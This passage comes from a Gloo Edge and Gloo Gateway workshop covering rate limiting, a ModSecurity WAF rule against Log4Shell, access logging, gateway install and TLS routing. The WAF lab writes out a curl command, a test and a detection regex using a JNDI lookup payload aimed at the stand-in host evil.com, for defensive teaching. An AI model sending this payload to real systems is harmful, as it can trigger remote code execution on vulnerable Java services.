  name: httpbin-options
  namespace: gloo-system
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: gloo-system
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                organization:
                  header: 'X-Email'
                  regex: '.*@(.*)$'
                  subgroup: 1
              headers:
                x-organization:
                  text: '{{ organization }}'
    jwtStaged:
      afterExtAuth:
        providers:
          keycloak:
            issuer: ${KEYCLOAK_MASTER_REALM_URL}
            keepToken: true
            tokenSource:
              headers:
              - header: jwt
            claimsToHeaders:
            - claim: email
              header: x-email
            - claim: subscription
              header: x-subscription
            jwks:
              remote:
                url: http://keycloak.keycloak.svc:8080/realms/workshop/protocol/openid-connect/certs
                upstreamRef:
                  name: keycloak-keycloak-8080
                  namespace: gloo-system
    rateLimitConfigs:
      refs:
      - name: limit-users
        namespace: gloo-system
EOF

```

Next, update the virtual service to reference the newly created `VirtualHostOption`.

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs-httpbin
  namespace: gloo-system
spec:
  sslConfig:
    secretRef:
      name: upstream-tls
      namespace: gloo-system
  virtualHost:
    domains:
      - 'httpbin.solo.io'
    routes:
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
    optionsConfigRefs:
      delegateOptions:
        - name: httpbin-options
          namespace: gloo-system
EOF
```

After the refactoring, if you re-query the `httpbin` service, you will see that everything still works the same: the request is authenticated and authorized, claims are extracted and stored as headers, and rate-limiting applies.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("The rate limit for free sub users", function() {
  const cookieString = process.env.USER2_COOKIE;
  
  it("have only 2 requests per minute", () => {
    helpersHttp.checkURL({ host: `https://httpbin.solo.io`, headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 });
    helpersHttp.checkURL({ host: `https://httpbin.solo.io`, headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 });
    helpersHttp.checkURL({ host: `https://httpbin.solo.io`, headers: [{ key: 'Cookie', value: cookieString }], retCode: 429 });
  });
});

describe("The rate limit for enterprise sub users", function() {
  const cookieString = process.env.USER1_COOKIE;
  
  it("have only 8 requests per minute", () => {

    for (let i = 0; i < 8; i++) {
      helpersHttp.checkURL({ host: `https://httpbin.solo.io`, headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 });
    }
    
    helpersHttp.checkURL({ host: `https://httpbin.solo.io`, headers: [{ key: 'Cookie', value: cookieString }], retCode: 429 });
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/imported/gloo-edge/templates/steps/rate-limiting/tests/subscription-based-rate-limit.test.js.liquid from lab number 8"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
-->




## Lab 9 - Web application firewall <a name="lab-9---web-application-firewall-"></a>

A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.

Gloo Edge Enterprise includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 

An example of how using Gloo Edge we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.

## What is the Log4Shell vulnerability? 

The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 

Using the Web Application Firewall capabilities you can reject requests containing such headers. 

## Demonstrate a vulnerable service

Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.

We'll first establish a virtual service that does NOT protect against the exploit, and evaluate it against the httpbin service we installed in earlier exercises.

```bash
cat <<'EOF' | envsubst | kubectl apply -f -
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs-httpbin
  namespace: gloo-system
spec:
  virtualHost:
    domains:
      - "httpbin.solo.io"
    routes:
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
EOF
```

We'll simulate one of these attack vectors by passing our `evil.com` string in a request header to our gateway, and then see that request routed to the target service.

We'll use curl to simulate the attack, passing in the attack string as the value of the standard `User-Agent` header:

```bash
curl -H "User-Agent: \${jndi:ldap://evil.com/x}" http://httpbin.solo.io/anything -i
```

You should see a response that looks similar to the one below. Note that if the system under attack logged out its `User-Agent` header using log4j, then it could potentially be compromised.

```
HTTP/1.1 200 OK
date: Mon, 13 Dec 2021 23:20:22 GMT
content-type: application/json
content-length: 444
server: envoy
access-control-allow-origin: *
access-control-allow-credentials: true
x-envoy-upstream-service-time: 41

{
  "args": {},
  "data": "",
  "files": {},
  "form": {},
  "headers": {
    "Accept": "*/*",
    "Host": "34.138.145.188",
    "User-Agent": "${jndi:ldap://evil.com/x}",    <<< THIS IS BAD!!!
    ...
  }
...
}
```

## Protect the vulnerable service

Now we will protect the httpbin service by applying a modified virtual service to the cluster, with a ModSecurity rule added that blocks input strings containing potential Log4Shell attacks.

```bash
cat <<'EOF' | envsubst | kubectl apply -f -
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs-httpbin
  namespace: gloo-system
spec:
  virtualHost:
    domains:
      - "httpbin.solo.io"
    routes:
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
    options:
      waf:
        customInterventionMessage: 'Log4Shell malicious payload'
        ruleSets:
        - ruleStr: |
            SecRuleEngine On
            SecRequestBodyAccess On
            SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
              "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
              "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
EOF
```

Let's examine briefly what this rule does. Line 1 identifies ModSec variables we want to match, entities like the `REQUEST_BODY` and `REQUEST_HEADERS`. These are entities where the contents might be logged by log4j when the request is received, so we want to be sure to protect them.

Line 2 is the condition that is applied to the variables listed in Line 1. In this case, we're matching against strings that begin with `${jndi`.

Finally, Line 3 defines the action to be taken when the rule is matched. In this case, we are denying the request and passing back a `403 Forbidden` error code.

Now, if you try to make a request containing a header that exploits this vulnerability the request will be rejected before reaching the service.
<!--bash
echo "Sleeping for 30 seconds to allow the config to be applied"
sleep 30
-->
```bash
curl -H "User-Agent: \${jndi:ldap://evil.com/x}" http://httpbin.solo.io/anything -i
```

Since one of the REQUEST_HEADERS (`User-Agent`) contains a value that matches the regular expression in the ModSec rule, you should see the request rejected with a `403 Forbidden` error, like this:

```log,nocopy
HTTP/1.1 403 Forbidden
content-length: 27
content-type: text/plain
date: Mon, 13 Dec 2021 23:56:13 GMT
server: envoy

Log4Shell malicious payload
```

However, the same curl request with a proper `User-Agent` header would be accepted with no errors.

```bash
curl -H "User-Agent: curl/7.74.0" http://httpbin.solo.io/anything -i
```

Here's a snippet of the expected response:

```
HTTP/1.1 200 OK
server: envoy
date: Mon, 13 Dec 2021 23:59:34 GMT
content-type: application/json
content-length: 383
...
{
  "args": {}, 
  ...
  "headers": {
    ...
    "User-Agent": "curl/7.74.0", 
    ...
  }, 
  ...
  "url": "http://httpbin.kubernetes.rmtxxkufojcx.instruqt.io/anything"
}
```

For more information on the log4j vulnerability, check our blog "[Block Log4Shell attacks with Gloo Edge](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/)".

To learn about the WAF capabilities of Gloo Edge check out "[Web Application Firewall - Gloo Edge Docs](https://docs.solo.io/gloo-edge/latest/guides/security/waf/)"

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Request should be blocked for jndi header", () => {
  it('Request is blocked', () => { 
    helpers.checkURL({ host: `http://httpbin.solo.io`, path: '/anything', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], retCode: 403 });
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/imported/gloo-edge/templates/steps/web-application-firewall/tests/firewall-block-agent.test.js.liquid from lab number 9"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
-->




## Lab 10 - Observability <a name="lab-10---observability-"></a>

## Metrics

Gloo Edge automatically generates a Grafana dashboard for whole-cluster stats (overall request timing, aggregated response codes, etc.), and dynamically generates a more-specific dashboard for each upstream that is tracked.

Let's run the following command to allow access to the Grafana UI:

```bash,noexecute
kubectl port-forward -n gloo-system svc/glooe-grafana 8081:80 --address 0.0.0.0
```

You can now access the Grafana UI at http://localhost:8081 and log in with `admin/admin`.

You can take a look at the `Gloo -> Envoy Statistics` Dashboard that provides global statistics:

![Grafana Envoy Statistics](images/steps/gloo-edge/observability/grafana-envoy-stats.png)

You can also see that Gloo is dynamically generating a Dashboard for each Upstream:

![Grafana Upstream](images/steps/gloo-edge/observability/grafana-upstream.png)

You can run the following command to see the default template used to generate these templates:

```bash,noexecute
kubectl -n gloo-system get cm gloo-observability-config -o yaml
```

If you want to customize how these per-upstream dashboards look, you can provide your template to use by writing a Grafana dashboard JSON representation to that config map key.

## Access Logging

Access logs are important to check if a system is behaving correctly and for debugging purposes. Log aggregators like Datadog and Splunk use agents deployed on the Kubernetes clusters to collect logs.

Lets first enable access logging on the gateway:

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: Gateway
metadata:
  labels:
    app: gloo
  name: gateway-proxy
  namespace: gloo-system
spec:
  bindAddress: '::'
  bindPort: 8080
  httpGateway: {}
  proxyNames:
  - gateway-proxy
  useProxyProto: false
  options:
    accessLoggingService:
      accessLog:
      - fileSink:
          jsonFormat:
            # HTTP method name
            httpMethod: '%REQ(:METHOD)%'
            # Protocol. Currently either HTTP/1.1 or HTTP/2.
            protocol: '%PROTOCOL%'
            # HTTP response code. Note that a response code of ‘0’ means that the server never sent the
            # beginning of a response. This generally means that the (downstream) client disconnected.
            responseCode: '%RESPONSE_CODE%'
            # Total duration in milliseconds of the request from the start time to the last byte out
            clientDuration: '%DURATION%'
            # Total duration in milliseconds of the request from the start time to the first byte read from the upstream host
            targetDuration: '%RESPONSE_DURATION%'
            # Value of the "x-envoy-original-path" header (falls back to "path" header if not present)
            path: '%REQ(X-ENVOY-ORIGINAL-PATH?:PATH)%'
            # Upstream cluster to which the upstream host belongs to
            upstreamName: '%UPSTREAM_CLUSTER%'
            # Request start time including milliseconds.
            systemTime: '%START_TIME%'
            # Unique tracking ID
            requestId: '%REQ(X-REQUEST-ID)%'
            # Response flags; will contain RL if the request was rate-limited
            responseFlags: '%RESPONSE_FLAGS%'
            # We rate-limit on the x-type header
            messageType: '%REQ(x-type)%'
            # We rate-limit on the x-number header
            number: '%REQ(x-number)%'
          path: /dev/stdout
EOF
```

NOTE:  You can safely ignore the following warning when you run the above command:

```log,nocopy
Warning: kubectl apply should be used on resource created by either kubectl create --save-config or kubectl apply
```

Refresh your browser a couple of times to generate some traffic.
The following command opens the app in a new browser window:

```
/opt/google/chrome/chrome http://echo.solo.io
```

Check the access logs running the following command:

```bash,noexecute
kubectl logs -n gloo-system deployment/gateway-proxy | grep '^{' | jq
```

If you refresh the browser to send additional requests, then you will see both `200 OK` responses in the access logs, as in the example below.

```json,nocopy
{
  "messageType": null,
  "requestId": "06c54299-de6b-463e-8035-aebd3e530cb5",
  "httpMethod": "GET",
  "systemTime": "2020-10-22T21:38:18.316Z",
  "path": "/productpage",
  "targetDuration": 31,
  "protocol": "HTTP/2",
  "responseFlags": "-",
  "number": null,
  "clientDuration": 31,
  "upstreamName": "httpbin-httpbin-8000_gloo-system",
  "responseCode": 200
}
```

These logs can now be collected by the Log aggregator agents and potentially forwarded to your favorite enterprise logging service.




## Lab 11 - Deploy Gloo Gateway <a name="lab-11---deploy-gloo-gateway-"></a>

You can deploy Gloo Gateway with the `glooctl` CLI or declaratively using Helm.

We're going to use the Helm option.

Install the Kubernetes Gateway API CRDs as they do not come installed by default on most Kubernetes clusters.

```bash
kubectl --context $CLUSTER1 apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.2.0/experimental-install.yaml
```


We need to create a secret to let the Gateway Portal know how to connect to Postgres

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: portal-database-config
  namespace: gloo-system
type: Opaque
data:
  config.yaml: |
    ZHNuOiBob3N0PXBvc3RncmVzLmdsb28tc3lzdGVtLnN2Yy5jbHVzdGVyLmxvY2FsIHBvcnQ9NTQzMiB1c2VyPWFkbWluIHBhc3N3b3JkPWFkbWluIGRibmFtZT1kYiBzc2xtb2RlPWRpc2FibGUK
EOF
```


Next, install Gloo Gateway. This command installs the Gloo Gateway control plane into the namespace `gloo-system`.

```bash

helm repo add gloo-ee-helm https://storage.googleapis.com/gloo-ee-helm
helm repo update

helm upgrade -i -n gloo-system \
  gloo-gateway gloo-ee-helm/gloo-ee \
  --create-namespace \
  --version 1.18.9 \
  --kube-context $CLUSTER1 \
  --set-string license_key=$LICENSE_KEY \
  -f -<<EOF

gloo:
  kubeGateway:
    enabled: true
    portal:
      enabled: true
  gatewayProxies:
    gatewayProxy:
      disabled: false
  gateway:
    validation:
      allowWarnings: true
      alwaysAcceptResources: false
  gloo:
    logLevel: info
    deployment:
      livenessProbeEnabled: true
  discovery:
    enabled: false
observability:
  enabled: false
prometheus:
  enabled: false
grafana:
  defaultInstallationEnabled: false
gloo-fed:
  enabled: false
  glooFedApiserver:
    enable: false
gateway-portal-web-server:
  enabled: true
  glooPortalServer:
    database:
      type: postgres
global:
  extensions:
    caching:
      enabled: true
EOF
kubectl --context $CLUSTER1 patch settings default -n gloo-system --type json \
  -p '[{ "op": "remove", "path": "/spec/cachingServer" }]'
```





Run the following command to check that the Gloo Gateway pods are running:

<!--bash
echo -n Waiting for Gloo Gateway pods to be ready...
kubectl --context $CLUSTER1 -n gloo-system rollout status deployment
-->
```bash
kubectl --context $CLUSTER1 -n gloo-system get pods
```

Here is the expected output:

```,nocopy
NAME                                         READY   STATUS      RESTARTS   AGE
caching-service-79cf55ccbb-dcvgp             1/1     Running     0          69s
extauth-58f68c5cd5-gxgxc                     1/1     Running     0          69s
gateway-portal-web-server-5c5d58d8d5-7lzwg   1/1     Running     0          69s
gloo-7d8994697-lfg5x                         1/1     Running     0          69s
gloo-resource-rollout-check-x8b77            0/1     Completed   0          69s
gloo-resource-rollout-cjtgh                  0/1     Completed   0          69s
rate-limit-6db9c67794-vf7h2                  1/1     Running     0          69s
redis-6c7c489d8c-g2dhc                       1/1     Running     0          69s
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Gloo Gateway", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["gloo", "extauth", "rate-limit", "redis"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-system", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-gloo-gateway-enterprise/tests/check-gloo.test.js.liquid from lab number 11"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
-->



## Lab 12 - Deploy the httpbin demo app <a name="lab-12---deploy-the-httpbin-demo-app-"></a>


We're going to deploy the httpbin application to demonstrate several features of Gloo Gateway.

You can find more information about this application [here](http://httpbin.org/).

Run the following commands to deploy the httpbin app twice (`httpbin1` and `httpbin2`).

```bash
kubectl --context ${CLUSTER1} create ns httpbin
kubectl --context ${CLUSTER1} apply -f data/steps/deploy-httpbin/app-httpbin1.yaml
kubectl --context ${CLUSTER1} apply -f data/steps/deploy-httpbin/app-httpbin2.yaml
```

<details>
  <summary>Show yaml files</summary>

```yaml
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: httpbin1
  namespace: httpbin
---
apiVersion: v1
kind: Service
metadata:
  name: httpbin1
  namespace: httpbin
  labels:
    app: httpbin1
    service: httpbin1
spec:
  ports:
  - name: http
    port: 8000
    targetPort: http
    protocol: TCP
    appProtocol: http
  selector:
    app: httpbin1
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: httpbin1
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: httpbin1
      version: v1
  template:
    metadata:
      labels:
        app: httpbin1
        version: v1
    spec:
      serviceAccountName: httpbin1
      containers:
      - name: httpbin
        image: mccutchen/go-httpbin:v2.14.0
        command: [ go-httpbin ]
        args:
          - "-max-duration"
          - "600s" # override default 10s
          - -use-real-hostname
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        livenessProbe:
          httpGet:
            path: /status/200
            port: http
        readinessProbe:
          httpGet:
            path: /status/200
            port: http
        env:
        - name: K8S_MEM_LIMIT
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.memory
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.cpu
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: httpbin2
  namespace: httpbin
---
apiVersion: v1
kind: Service
metadata:
  name: httpbin2
  namespace: httpbin
  labels:
    app: httpbin2
    service: httpbin2
spec:
  ports:
  - name: http
    port: 8000
    targetPort: http
    protocol: TCP
    appProtocol: http
  selector:
    app: httpbin2
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: httpbin2
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: httpbin2
      version: v1
  template:
    metadata:
      labels:
        app: httpbin2
        version: v1
    spec:
      serviceAccountName: httpbin2
      containers:
      - name: httpbin
        image: mccutchen/go-httpbin:v2.14.0
        command: [ go-httpbin ]
        args:
          - "-max-duration"
          - "600s" # override default 10s
          - -use-real-hostname
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        livenessProbe:
          httpGet:
            path: /status/200
            port: http
        readinessProbe:
          httpGet:
            path: /status/200
            port: http
        env:
        - name: K8S_MEM_LIMIT
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.memory
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.cpu
```
</details>

You can follow the progress using the following command:

<!--bash
echo -n Waiting for httpbin pods to be ready...
kubectl --context ${CLUSTER1} -n httpbin rollout status deployment
-->
```bash,noexecute
kubectl --context ${CLUSTER1} -n httpbin get pods
```

Here is the expected output when both Pods are ready:

```,nocopy
NAME                        READY   STATUS    RESTARTS   AGE
httpbin1-7fdbf6498-ms7qt    1/1     Running   0          94s
httpbin2-655777b846-6nrms   1/1     Running   0          93s
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("httpbin app", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["httpbin1", "httpbin2"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "httpbin", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/deploy-httpbin/tests/check-httpbin.test.js.liquid from lab number 12"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
-->




## Lab 13 - Expose the httpbin application through the gateway <a name="lab-13---expose-the-httpbin-application-through-the-gateway-"></a>




The team in charge of the gateway can create a `Gateway` resource and configure an HTTP listener.




```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
kind: Gateway
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: http
  namespace: gloo-system
spec:
  gatewayClassName: gloo-gateway
  listeners:
  - protocol: HTTP
    port: 80
    name: http
    allowedRoutes:
      namespaces:
        from: All
EOF
```

Note that application teams can create and attach their `HTTPRoute` to this gateway.

An application team can create an `HTTPRoute` resource to expose the `httpbin` app on the gateway.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: http
  hostnames:
    - "httpbin.example.com"
  rules:
    - backendRefs:
        - name: httpbin1
          port: 8000
EOF
```




Set the environment variable for the service corresponding to the gateway:

```bash
export PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
```

<!--bash
RETRY_COUNT=0
MAX_RETRIES=60
GLOO_PROXY_SVC=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -oname)
while [[ -z "$PROXY_IP" && $RETRY_COUNT -lt $MAX_RETRIES && $GLOO_PROXY_SVC ]]; do
  echo "Waiting for PROXY_IP to be assigned... Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
  PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
  RETRY_COUNT=$((RETRY_COUNT + 1))
  sleep 5
done

# if PROXY_IP is a hostname, resolve it to an IP address
if [[ -n "$PROXY_IP" && $PROXY_IP =~ [a-zA-Z] ]]; then
  while [[ -z "$IP" && $RETRY_COUNT -lt $MAX_RETRIES ]]; do
    echo "Waiting for PROXY_IP to be propagated in DNS... Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
    IP=$(dig +short A "$PROXY_IP" | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ {print; exit}')
    RETRY_COUNT=$((RETRY_COUNT + 1))
    sleep 5
  done
else
  IP="$PROXY_IP"
fi

if [[ -z "$PROXY_IP" ]]; then
  echo "WARNING: Maximum number of retries reached. PROXY_IP could not be assigned."
else
  export PROXY_IP
  export IP
  echo "PROXY_IP has been assigned: $PROXY_IP"
  echo "IP has been resolved to: $IP"
fi
-->

Configure your hosts file to resolve httpbin.example.com with the IP address of the proxy by executing the following command:

```bash

./scripts/register-domain.sh httpbin.example.com ${PROXY_IP}

```


Try to access the application through HTTP:

```bash,noexecute
curl http://httpbin.example.com/get
```

Here is the expected output:

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin.example.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Forwarded-Proto": [
      "http"
    ],
    "X-Request-Id": [
      "d0998a48-7532-4eeb-ab69-23cef22185cf"
    ]
  },
  "method": "GET",
  "origin": "127.0.0.6:38917",
  "url": "http://httpbin.example.com/get"
}
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTP", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `http://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/expose-httpbin/tests/http.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
-->

Now, let's secure the access through TLS.
Let's first create a private key and a self-signed certificate:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
   -keyout tls.key -out tls.crt -subj "/CN=*"
```

Then, you have to store it in a Kubernetes secret running the following command:

```bash
kubectl create --context ${CLUSTER1} -n gloo-system secret tls tls-secret --key tls.key \
   --cert tls.crt
```
Update the `Gateway` resource to add HTTPS listeners.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
kind: Gateway
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: http
  namespace: gloo-system
spec:
  gatewayClassName: gloo-gateway
  listeners:
  - protocol: HTTPS
    port: 443
    name: https-httpbin
    hostname: httpbin.example.com
    tls:
      mode: Terminate
      certificateRefs:
        - name: tls-secret
          kind: Secret
    allowedRoutes:
      namespaces:
        from: All
  - protocol: HTTPS
    port: 443
    name: https
    tls:
      mode: Terminate
      certificateRefs:
        - name: tls-secret
          kind: Secret
    allowedRoutes:
      namespaces:
        from: All
  - protocol: HTTP
    port: 80
    name: http
    allowedRoutes:
      namespaces:
        from: All
EOF
```

As you can see, we've added 2 new listeners. One for the `httpbin.example.com` hostname and one for all the other hostnames.

We used the same secret to keep things simple, but the goal is to demonstrate we can have different HTTPS listeners.

Update the `HTTPRoute` resource to expose the `httpbin` app through HTTPS.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gloo-proxy-http
```


Try to access the application through HTTPS (might take a few seconds to be ready):

<!--bash
echo -n Wait for up to 2 minutes until the url is ready...
RETRY_COUNT=0
MAX_RETRIES=30
while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
  echo "Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
  ret=`curl -k -s -o /dev/null -w %{http_code} https://httpbin.example.com/get`
  if [ "$ret" -eq "200" ]; then
    break
  else
    echo "Response was: $ret"
    echo "Retrying in 4 seconds..."
  fi
  RETRY_COUNT=$((RETRY_COUNT + 1))
  sleep 4
done
-->

```bash,noexecute
curl -k https://httpbin.example.com/get
```

Here is the expected output:

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin.example.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Forwarded-Proto": [
      "https"
    ],
    "X-Request-Id": [
      "8e61c480-6373-4c38-824b-2bfe89e79d0c"
    ]
  },
  "method": "GET",
  "origin": "127.0.0.6:52655",
  "url": "https://httpbin.example.com/get"
}
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/expose-httpbin/tests/https.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
-->


The team in charge of the gateway can create an `HTTPRoute` to automatically redirect HTTP to HTTPS:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: redirect-http-to-https
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: http
  hostnames:
    - "httpbin.example.com"
  rules:
    - filters:
      - type: RequestRedirect
        requestRedirect:
          scheme: https
EOF
```

Try to access the application through HTTP:

```bash,noexecute
curl -k http://httpbin.example.com/get -L
```

The `-L` option instructs curl to follow the redirect. Without it, you would get a `302` response with the `location` header set to the HTTPS url.

Here is the expected output:

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin.example.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Forwarded-Proto": [
      "https"
    ],
    "X-Request-Id": [
      "2c7454cb-c2f8-428c-9c3b-f51822475327"
    ]
  },
  "method": "GET",
  "origin": "127.0.0.6:52655",
  "url": "https://httpbin.example.com/get"
}
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("location header correctly set", () => {
  it('Checking text \'location\'', () => helpersHttp.checkHeaders({ host: `http://httpbin.example.com`, path: '/get', expectedHeaders: [{'key': 'location', 'value': `https://httpbin.example.com/get`}]}));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/expose-httpbin/tests/redirect-http-to-https.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
-->





## Lab 14 - Delegate with control <a name="lab-14---delegate-with-control-"></a>

The team in charge of the gateway can create a parent `HTTPRoute` to delegate the routing of a domain or a path prefix (for example) to an application team.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
